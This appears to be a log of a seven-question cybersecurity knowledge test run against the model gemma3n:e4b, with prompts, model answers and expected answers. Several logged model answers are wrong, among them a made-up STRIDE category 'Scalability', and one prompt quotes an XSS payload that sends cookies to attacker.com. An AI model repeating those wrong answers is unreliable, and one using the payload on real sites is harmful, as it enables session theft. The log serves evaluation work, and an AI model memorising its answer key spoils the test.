@@ -1,0 +1,171 @@
+Cybersecurity Sanity Test Log
+Run Mode: gemma3n_e4b
+Initialized: 2025-07-15T22:57:36.003813
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T22:57:48.132521
+Model: gemma3n:e4b
+Category: Basic Definitions - Identification
+Response Time: 12.12 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?
+
+LLM RESPONSE:
+This is a **security requirement statement**. Its primary purpose is to **enhance system security by requiring multiple verification factors for administrative logins**, significantly reducing the risk of unauthorized access and account compromise. It aims to protect against stolen credentials and other attack vectors.
+
+EXPECTED SHORT ANSWER:
+This statement is a security requirement. Its purpose is to define a specific functionality or constraint (MFA) to protect critical access.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T22:58:10.580146
+Model: gemma3n:e4b
+Category: Frameworks - Application
+Response Time: 22.43 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A company experiences a ransomware attack. They activate their incident response plan to contain the damage and begin restoring systems from backups. According to the NIST Cybersecurity Framework (CSF), which two core functions are most prominently demonstrated by these actions?
+
+LLM RESPONSE:
+According to the NIST Cybersecurity Framework (CSF), the two core functions most prominently demonstrated by the actions of containing damage and restoring from backups during a ransomware attack are:
+
+1. **Identify:**  The incident response plan activation and damage assessment are part of identifying the cyber risk and the impact of the attack.
+2. **Respond:** Containing the damage and restoring systems directly fall under the Respond function, as they are actions taken to address and mitigate the consequences of the cyber incident.
+
+EXPECTED SHORT ANSWER:
+The primary functions demonstrated are 'Respond' (activating the incident plan) and 'Recover' (restoring from backups).
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T22:58:25.533023
+Model: gemma3n:e4b
+Category: Security Controls - Identification
+Response Time: 14.94 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?
+
+LLM RESPONSE:
+The control family in NIST SP 800-53 that specifically addresses recording privileged user actions in immutable, time-stamped logs is **AC - Access Control**. More specifically, **AC-4 (Audit Events)** falls under this category.
+
+EXPECTED SHORT ANSWER:
+This requirement is addressed by the 'AU' (Audit and Accountability) control family.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T22:58:39.631340
+Model: gemma3n:e4b
+Category: Vulnerabilities - Identification
+Response Time: 14.09 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?
+
+LLM RESPONSE:
+The common name for this vulnerability is **Cross-Site Scripting (XSS)**. 
+
+Its corresponding CWE identifier is **CWE-79**.
+
+EXPECTED SHORT ANSWER:
+This vulnerability is known as Cross-Site Scripting (XSS). Its corresponding identifier is CWE-79.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T22:58:58.630953
+Model: gemma3n:e4b
+Category: Threat Modeling - Classification
+Response Time: 19.00 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+During a threat modeling exercise, a team identifies a risk where an unauthorized user could intercept and alter data packets being sent between a client and a server, changing the amount of a financial transaction. Within the STRIDE threat model, which category does this threat belong to?
+
+LLM RESPONSE:
+This threat primarily falls under the **Scalability** category of the STRIDE threat model. 
+
+Specifically, it relates to **Spoofing** (the attacker disguises themselves as a legitimate party) and **Tampering** (the attacker modifies the data in transit). The ability to alter data packets directly impacts the integrity and reliability of the system, which is a scalability concern.
+
+EXPECTED SHORT ANSWER:
+This threat belongs to the 'Tampering' category of the STRIDE model, as it involves the unauthorized modification of data.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T22:59:16.317852
+Model: gemma3n:e4b
+Category: Regulations/Directives - Application
+Response Time: 17.68 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?
+
+LLM RESPONSE:
+For incident 1 (power grid disruption), the primary concern is the **Network and Information Security (NIS) Directive**. 
+
+For incident 2 (data breach of personal messages), the primary concern is the **General Data Protection Regulation (GDPR)**.
+
+EXPECTED SHORT ANSWER:
+Incident 1 (disruption of critical infrastructure) is primarily a concern for the NIS 2 Directive. Incident 2 (breach of personal data) is a primary concern for GDPR.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T22:59:27.032473
+Model: gemma3n:e4b
+Category: Basic Principles - Application
+Response Time: 10.71 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A cloud storage service uses data checksums (like SHA-256 hashes) to verify that files have not been altered or corrupted during upload or download. Which principle of the CIA triad is primarily being upheld by this security control?
+
+LLM RESPONSE:
+**Integrity** is the principle of the CIA triad primarily upheld by using data checksums. Checksums ensure data remains unaltered and trustworthy.
+
+EXPECTED SHORT ANSWER:
+This control primarily upholds the principle of 'Integrity'.
+
+--- End of Test Case ---
+==================================================
+
+--- Run Summary ---
+
+Model: gemma3n:e4b
+  - Total Tests: 7
+  - Total Time Spent in LLM Calls: 110.97 seconds
+  - Average Response Time: 15.85 seconds
+
+Total Number of Test Cases Configured: 7
+
+End of Log.
